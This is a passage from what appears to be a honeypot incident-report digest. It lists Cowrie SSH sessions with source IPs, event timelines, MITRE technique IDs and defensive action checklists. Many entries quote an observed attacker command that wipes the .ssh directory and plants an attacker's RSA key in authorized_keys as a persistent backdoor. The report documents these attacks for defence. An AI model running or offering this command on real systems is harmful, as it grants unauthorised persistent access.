| `2026-05-20 20:02:38` | `cowrie.command.failed` |
| `2026-05-20 20:02:39` | `cowrie.log.closed` |
| `2026-05-20 20:02:39` | `cowrie.session.params` |
| `2026-05-20 20:02:39` | `cowrie.command.input` |
| `2026-05-20 20:02:39` | `cowrie.session.file_download` |
| `2026-05-20 20:02:39` | `cowrie.log.closed` |
| `2026-05-20 20:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5f2d97a7688

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 20:02 |
| **Last Seen** | 2026-05-20 20:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:02:42` | `cowrie.session.connect` |
| `2026-05-20 20:02:42` | `cowrie.client.version` |
| `2026-05-20 20:02:43` | `cowrie.client.kex` |
| `2026-05-20 20:02:44` | `cowrie.login.success` |
| `2026-05-20 20:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f944179e555

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:03 |
| **Last Seen** | 2026-05-20 20:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:03:12` | `cowrie.session.connect` |
| `2026-05-20 20:03:12` | `cowrie.client.version` |
| `2026-05-20 20:03:12` | `cowrie.client.kex` |
| `2026-05-20 20:03:13` | `cowrie.login.success` |
| `2026-05-20 20:03:13` | `cowrie.session.params` |
| `2026-05-20 20:03:13` | `cowrie.command.input` |
| `2026-05-20 20:03:13` | `cowrie.command.failed` |
| `2026-05-20 20:03:14` | `cowrie.log.closed` |
| `2026-05-20 20:03:14` | `cowrie.session.params` |
| `2026-05-20 20:03:14` | `cowrie.command.input` |
| `2026-05-20 20:03:14` | `cowrie.session.file_download` |
| `2026-05-20 20:03:14` | `cowrie.log.closed` |
| `2026-05-20 20:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30b7675ecc4e

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:03 |
| **Last Seen** | 2026-05-20 20:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:03:17` | `cowrie.session.connect` |
| `2026-05-20 20:03:17` | `cowrie.client.version` |
| `2026-05-20 20:03:17` | `cowrie.client.kex` |
| `2026-05-20 20:03:18` | `cowrie.login.success` |
| `2026-05-20 20:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c729a114dac

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-20 20:04 |
| **Last Seen** | 2026-05-20 20:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:04:00` | `cowrie.session.connect` |
| `2026-05-20 20:04:00` | `cowrie.client.version` |
| `2026-05-20 20:04:00` | `cowrie.client.kex` |
| `2026-05-20 20:04:01` | `cowrie.login.success` |
| `2026-05-20 20:04:01` | `cowrie.session.params` |
| `2026-05-20 20:04:01` | `cowrie.command.input` |
| `2026-05-20 20:04:01` | `cowrie.command.failed` |
| `2026-05-20 20:04:01` | `cowrie.log.closed` |
| `2026-05-20 20:04:01` | `cowrie.session.params` |
| `2026-05-20 20:04:01` | `cowrie.command.input` |
| `2026-05-20 20:04:01` | `cowrie.session.file_download` |
| `2026-05-20 20:04:01` | `cowrie.log.closed` |
| `2026-05-20 20:04:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df4d0fb98306

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-20 20:04 |
| **Last Seen** | 2026-05-20 20:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:04:04` | `cowrie.session.connect` |
| `2026-05-20 20:04:04` | `cowrie.client.version` |
| `2026-05-20 20:04:04` | `cowrie.client.kex` |
| `2026-05-20 20:04:05` | `cowrie.login.success` |
| `2026-05-20 20:04:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0733f4dad101

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]249` |
| **First Seen** | 2026-05-20 20:04 |
| **Last Seen** | 2026-05-20 20:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:04:06` | `cowrie.session.connect` |
| `2026-05-20 20:04:06` | `cowrie.client.version` |
| `2026-05-20 20:04:07` | `cowrie.client.kex` |
| `2026-05-20 20:04:07` | `cowrie.login.success` |
| `2026-05-20 20:04:08` | `cowrie.session.params` |
| `2026-05-20 20:04:08` | `cowrie.command.input` |
| `2026-05-20 20:04:08` | `cowrie.command.failed` |
| `2026-05-20 20:04:08` | `cowrie.log.closed` |
| `2026-05-20 20:04:08` | `cowrie.session.params` |
| `2026-05-20 20:04:08` | `cowrie.command.input` |
| `2026-05-20 20:04:08` | `cowrie.session.file_download` |
| `2026-05-20 20:04:08` | `cowrie.log.closed` |
| `2026-05-20 20:04:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]249` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cce6b430b440

| Field | Detail |
|---|---|
| **Source IP** | `154.144.225[.]226` |
| **First Seen** | 2026-05-20 20:04 |
| **Last Seen** | 2026-05-20 20:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:04:10` | `cowrie.session.connect` |
| `2026-05-20 20:04:10` | `cowrie.client.version` |
| `2026-05-20 20:04:10` | `cowrie.client.kex` |
| `2026-05-20 20:04:11` | `cowrie.login.success` |
| `2026-05-20 20:04:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.144.225[.]226` to AbuseIPDB if not already reported
- [ ] Block `154.144.225[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b70c755d3c0e

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 20:04 |
| **Last Seen** | 2026-05-20 20:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:04:25` | `cowrie.session.connect` |
| `2026-05-20 20:04:25` | `cowrie.client.version` |
| `2026-05-20 20:04:25` | `cowrie.client.kex` |
| `2026-05-20 20:04:26` | `cowrie.login.success` |
| `2026-05-20 20:04:27` | `cowrie.session.params` |
| `2026-05-20 20:04:27` | `cowrie.command.input` |
| `2026-05-20 20:04:27` | `cowrie.command.failed` |
| `2026-05-20 20:04:27` | `cowrie.log.closed` |
| `2026-05-20 20:04:27` | `cowrie.session.params` |
| `2026-05-20 20:04:27` | `cowrie.command.input` |
| `2026-05-20 20:04:27` | `cowrie.session.file_download` |
| `2026-05-20 20:04:27` | `cowrie.log.closed` |
| `2026-05-20 20:04:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3168f05e72aa

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 20:04 |
| **Last Seen** | 2026-05-20 20:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:04:30` | `cowrie.session.connect` |
| `2026-05-20 20:04:30` | `cowrie.client.version` |
| `2026-05-20 20:04:30` | `cowrie.client.kex` |
| `2026-05-20 20:04:31` | `cowrie.login.success` |
| `2026-05-20 20:04:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7698bc89c877

| Field | Detail |
|---|---|
| **Source IP** | `154.144.225[.]226` |
| **First Seen** | 2026-05-20 20:05 |
| **Last Seen** | 2026-05-20 20:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:05:16` | `cowrie.session.connect` |
| `2026-05-20 20:05:16` | `cowrie.client.version` |
| `2026-05-20 20:05:17` | `cowrie.client.kex` |
| `2026-05-20 20:05:17` | `cowrie.login.success` |
| `2026-05-20 20:05:17` | `cowrie.session.params` |
| `2026-05-20 20:05:17` | `cowrie.command.input` |
| `2026-05-20 20:05:17` | `cowrie.command.failed` |
| `2026-05-20 20:05:18` | `cowrie.log.closed` |
| `2026-05-20 20:05:18` | `cowrie.session.params` |
| `2026-05-20 20:05:18` | `cowrie.command.input` |
| `2026-05-20 20:05:18` | `cowrie.session.file_download` |
| `2026-05-20 20:05:18` | `cowrie.log.closed` |
| `2026-05-20 20:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.144.225[.]226` to AbuseIPDB if not already reported
- [ ] Block `154.144.225[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e09c8849c2f

| Field | Detail |
|---|---|
| **Source IP** | `81.192.138[.]65` |
| **First Seen** | 2026-05-20 20:05 |
| **Last Seen** | 2026-05-20 20:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:05:20` | `cowrie.session.connect` |
| `2026-05-20 20:05:20` | `cowrie.client.version` |
| `2026-05-20 20:05:20` | `cowrie.client.kex` |
| `2026-05-20 20:05:21` | `cowrie.login.success` |
| `2026-05-20 20:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.138[.]65` to AbuseIPDB if not already reported
- [ ] Block `81.192.138[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25731ce68744

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:05 |
| **Last Seen** | 2026-05-20 20:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:05:56` | `cowrie.session.connect` |
| `2026-05-20 20:05:56` | `cowrie.client.version` |
| `2026-05-20 20:05:57` | `cowrie.client.kex` |
| `2026-05-20 20:05:58` | `cowrie.login.success` |
| `2026-05-20 20:05:58` | `cowrie.session.params` |
| `2026-05-20 20:05:58` | `cowrie.command.input` |
| `2026-05-20 20:05:58` | `cowrie.command.failed` |
| `2026-05-20 20:05:58` | `cowrie.log.closed` |
| `2026-05-20 20:05:59` | `cowrie.session.params` |
| `2026-05-20 20:05:59` | `cowrie.command.input` |
| `2026-05-20 20:05:59` | `cowrie.session.file_download` |
| `2026-05-20 20:05:59` | `cowrie.log.closed` |
| `2026-05-20 20:06:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8be2aca9796a

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:06 |
| **Last Seen** | 2026-05-20 20:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:06:02` | `cowrie.session.connect` |
| `2026-05-20 20:06:02` | `cowrie.client.version` |
| `2026-05-20 20:06:02` | `cowrie.client.kex` |
| `2026-05-20 20:06:03` | `cowrie.login.success` |
| `2026-05-20 20:06:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bbac54f6dd6

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 20:06 |
| **Last Seen** | 2026-05-20 20:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:06:20` | `cowrie.session.connect` |
| `2026-05-20 20:06:20` | `cowrie.client.version` |
| `2026-05-20 20:06:20` | `cowrie.client.kex` |
| `2026-05-20 20:06:21` | `cowrie.login.success` |
| `2026-05-20 20:06:21` | `cowrie.session.params` |
| `2026-05-20 20:06:21` | `cowrie.command.input` |
| `2026-05-20 20:06:21` | `cowrie.command.failed` |
| `2026-05-20 20:06:22` | `cowrie.log.closed` |
| `2026-05-20 20:06:22` | `cowrie.session.params` |
| `2026-05-20 20:06:22` | `cowrie.command.input` |
| `2026-05-20 20:06:22` | `cowrie.session.file_download` |
| `2026-05-20 20:06:22` | `cowrie.log.closed` |
| `2026-05-20 20:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72c2749d07fb

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 20:06 |
| **Last Seen** | 2026-05-20 20:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:06:27` | `cowrie.session.connect` |
| `2026-05-20 20:06:27` | `cowrie.client.version` |
| `2026-05-20 20:06:27` | `cowrie.client.kex` |
| `2026-05-20 20:06:28` | `cowrie.login.success` |
| `2026-05-20 20:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1409f170de61

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:08 |
| **Last Seen** | 2026-05-20 20:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:08:28` | `cowrie.session.connect` |
| `2026-05-20 20:08:28` | `cowrie.client.version` |
| `2026-05-20 20:08:29` | `cowrie.client.kex` |
| `2026-05-20 20:08:30` | `cowrie.login.success` |
| `2026-05-20 20:08:30` | `cowrie.session.params` |
| `2026-05-20 20:08:30` | `cowrie.command.input` |
| `2026-05-20 20:08:30` | `cowrie.command.failed` |
| `2026-05-20 20:08:31` | `cowrie.log.closed` |
| `2026-05-20 20:08:31` | `cowrie.session.params` |
| `2026-05-20 20:08:31` | `cowrie.command.input` |
| `2026-05-20 20:08:31` | `cowrie.session.file_download` |
| `2026-05-20 20:08:31` | `cowrie.log.closed` |
| `2026-05-20 20:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a668dcfa29d

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:08 |
| **Last Seen** | 2026-05-20 20:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:08:34` | `cowrie.session.connect` |
| `2026-05-20 20:08:34` | `cowrie.client.version` |
| `2026-05-20 20:08:34` | `cowrie.client.kex` |
| `2026-05-20 20:08:35` | `cowrie.login.success` |
| `2026-05-20 20:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05628a35a21d

| Field | Detail |
